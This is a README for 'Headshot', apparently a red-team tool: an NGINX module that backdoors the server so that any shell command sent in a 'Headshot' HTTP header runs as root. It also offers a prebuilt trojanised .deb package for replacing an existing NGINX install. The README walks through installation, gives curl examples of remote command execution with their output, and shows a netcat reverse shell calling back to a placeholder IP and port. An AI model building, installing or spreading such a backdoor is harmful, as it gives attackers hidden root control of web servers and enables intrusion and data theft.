# Headshot
NGINX module to allow for RCE through a specific header. Also forces NGINX to run as root.


## Installation
There is a install script provided in the repo. It will pull down NGINX and compile it with the module. Then NGINX directory will be setup in `/usr/local/nginx` (NGINX default). After this the `NGX_HTTP_CONTENT_PHASE` is hooked and the module will be running in NGINX. In addition, the deb file provided can be used to install the exploited NGINX to an already existing NGINX install, like so:

```
dpkg -i nginx-core_1.10.3.3-0ubuntu0.16.04.3_amd64.deb
```
In the event of compiling from source [this webpage](https://www.nginx.com/resources/wiki/start/topics/tutorials/installoptions/) maybe helpfule for the configure portion of `install.sh`.


## Usage
To use the Headshot simply supply your command as a value to the `Headshot` HTTP header. The output (stdout or stderr) of your command will be the response body of the command run. If there is no stdout or stderr from the command, then the response body will obviously be empty and a helpful string is returned. An example or two is shown below.

```
[root@localhost Headshot]# curl localhost --header "Headshot: ls -la /tmp"
total 4
drwxrwxrwt.  8 root root 123 Nov 30 11:39 .
dr-xr-xr-x. 17 root root 224 Oct 30 14:11 ..
drwxrwxrwt.  2 root root  19 Nov 29 22:23 .ICE-unix
drwxrwxrwt.  2 root root   6 Oct 30 14:09 .Test-unix
-r--r--r--.  1 root root  11 Nov 29 22:23 .X0-lock
drwxrwxrwt.  2 root root  16 Nov 29 22:23 .X11-unix
drwxrwxrwt.  2 root root   6 Oct 30 14:09 .XIM-unix
drwx------.  2 root root  20 Nov 29 22:24 .esd-0
drwxrwxrwt.  2 root root   6 Oct 30 14:09 .font-unix
[root@localhost Headshot]# curl localhost --header "Headshot: touch /tmp/hello"
<-- no stderr/stdout from your command -->
[root@localhost Headshot]# curl localhost --header "Headshot: ls -la /tmp"
total 4
drwxrwxrwt.  8 root   root   136 Nov 30 11:39 .
dr-xr-xr-x. 17 root   root   224 Oct 30 14:11 ..
drwxrwxrwt.  2 root   root    19 Nov 29 22:23 .ICE-unix
drwxrwxrwt.  2 root   root     6 Oct 30 14:09 .Test-unix
-r--r--r--.  1 root   root    11 Nov 29 22:23 .X0-lock
drwxrwxrwt.  2 root   root    16 Nov 29 22:23 .X11-unix
drwxrwxrwt.  2 root   root     6 Oct 30 14:09 .XIM-unix
drwx------.  2 root   root    20 Nov 29 22:24 .esd-0
drwxrwxrwt.  2 root   root     6 Oct 30 14:09 .font-unix
-rw-rw-rw-.  1 nobody nobody   0 Nov 30 11:39 hello
[root@localhost Headshot]# curl localhost --header "Headshot: not_a_command"
sh: 1: not_a_command: not found
```
If the header is not supplied then the server will respond to requests as normal. See below for example.
```
[root@localhost Headshot]# curl localhost
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

For those curious, if one were to setup a reverse shell from this exploit and a blue team member ran `ps -fax` then they would see something like the following output while the shell was active.

```
 17622 ?        Ss     0:00  \_ nginx: master process /usr/local/nginx/sbin/nginx
 17623 ?        S      0:00      \_ nginx: worker process
 17719 ?        S      0:00          \_ sh -c nc -c /bin/bash {YOUR_IP} {YOUR_PORT} 2>&1
 17720 ?        S      0:00              \_ sh -c /bin/bash
 17721 ?        S      0:00                  \_ /bin/bash
```

## Resources
[The foremost resource on NGINX Modules](https://www.evanmiller.org/nginx-modules-guide.html)

[A basic hello world module](https://github.com/perusio/nginx-hello-world-module/)

[The NGINX Source begins to be helpful after you loose sanity](https://github.com/nginx/nginx/)

[The NGINX API Documentation also helps](https://www.nginx.com/resources/wiki/extending/api/utility/)

[Also not a bad small guide](http://www.nginxguts.com/2011/02/http-modules/)
[From the same source as above but goes over NGINX Phases](http://www.nginxguts.com/2011/01/phases/)

[This would be the guide to follow to dynamically link the module](https://www.nginx.com/blog/compiling-dynamic-modules-nginx-plus/)

[This is where I go the idea to hook the NGX_HTTP_CONTENT_PHASE to avoid directive use](http://www.nginx-discovery.com/2011/02/day-21-http-handler-vs-content-phase.html)
